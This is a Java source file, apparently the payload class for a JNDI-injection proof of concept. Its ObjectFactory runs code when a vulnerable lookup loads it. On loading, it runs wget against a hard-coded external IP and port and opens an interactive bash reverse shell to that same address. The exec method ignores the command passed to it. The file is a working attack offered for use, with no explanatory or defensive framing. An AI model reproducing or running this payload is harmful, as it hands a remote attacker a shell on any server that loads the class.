package jndipoc.java;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class ExecTest implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        exec("xterm");
        return null;
    }

    public static String exec(String cmd) {
        try {
            Runtime.getRuntime().exec("wget http://47.102.137.160:8081");
            Runtime r = Runtime.getRuntime();
            String [] mycmd = {"/bin/bash","-c","bash -i >& /dev/tcp/47.102.137.160/8081 0>&1"};
            Process p = r.exec(mycmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    public static void main(String[] args) {
        exec("123");
    }
}